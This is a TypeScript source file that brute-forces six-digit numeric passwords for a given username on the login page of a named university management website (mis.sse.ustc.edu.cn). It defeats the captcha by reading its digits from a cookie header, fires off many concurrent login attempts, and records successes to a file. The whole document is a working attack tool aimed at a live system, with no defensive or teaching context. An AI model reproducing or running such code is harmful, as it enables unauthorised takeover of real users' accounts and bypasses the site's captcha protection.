import FormData = require("form-data");
import fetch from "node-fetch"
import cheerio = require("cheerio")
import fs =require( "fs")
import os = require("os")
const log = console.log
const baseUrl = "http://mis.sse.ustc.edu.cn/"
const pattern = /ValidateCode\.aspx(.*?)[0-9]\\/g

export function worker(username:string):Promise<any>{
  return new Promise((resolve,reject)=>{
    let times = 5 // retry times
    let success = false
    let view_state = ""
    let password = "000000"
  async function app(){
    log("username: ",username)
    const mypass = password
    try {
      const result = await fetch(baseUrl);
      if (parseInt(password) > 999999 ) {
        fs.appendFile("result.txt", "faied " + "用户名: " + username + "密码: " + os.EOL, err => {
          console.log(err);
        });
        resolve(false)
        return;
      }
      if(success){
        return 
      }
      const cookieJar: string[] = [];
      const sessionId = (result.headers.get("set-cookie") || "").split(";")[0];
      cookieJar.push(sessionId);
      const body = await result.text();
      const $ = cheerio.load(body);
      view_state = $("#__VIEWSTATE").val();
      const imgUrl = body.match(pattern) || [""];
      const url = baseUrl + imgUrl[0].replace("&amp;", "&");
      const r = await fetch(url, {
        headers: {
          "cookie": cookieJar.join(";")
        }
      });
      const str = r.headers.get("set-cookie") || "";
      cookieJar.push(str.split(";")[0]);
      const validateCode = (str.match(/[0-9]{4}/) || [""])[0];
      log("validate code:", validateCode);
      let sum = 0;
      validateCode.split("").forEach(val => {
        sum += parseInt(val);
      });
      log("sum:", sum);
      log("session", cookieJar);
      const formData = new FormData();
      formData.append("__EVENTTARGET", "winLogin$sfLogin$ContentPanel1$btnLogin");
      formData.append("__VIEWSTATE", view_state);
      formData.append("winLogin$sfLogin$txtUserLoginID", username);
      formData.append('winLogin$sfLogin$txtPassword', mypass);
      formData.append('winLogin$sfLogin$txtValidate', sum + "");
      const login = await fetch(baseUrl + "default.aspx", {
        method: "post",
        headers: {
          cookie: cookieJar.join(";")
        },
        body: formData
      });
      const iflysse = (login.headers.get("set-cookie") || "").split(";")[0];
      if (iflysse.length === 0) {
        log("failed ", "password: ", mypass);
        increase();
        cookieJar.length = 0;
        app();
      }
      else {
        log("success ", "用户名: ", username, "密码: ", mypass);
        fs.appendFile("result.txt", "success " + "用户名: " + username + "密码: " + os.EOL, err => {
          console.log(err);
        });
        success = true;
        resolve(true)
        return ;
      }
      cookieJar.push(iflysse);
    }
    catch (err) {
      log(err);
      if(times>0){
        app();//retry
        times--
      }else{
        reject(err)
      }
    }
  };
  
  function increase(){
    password = ""+(parseInt(password)+1)
    if(password.length<6){
      const len = password.length
      for(let i=0;i<6-len;i++){
        password = 0+password
      }
    }
  }
  
  for(let i=0;i<100;i++){
    increase()
    app()
  }
})

}
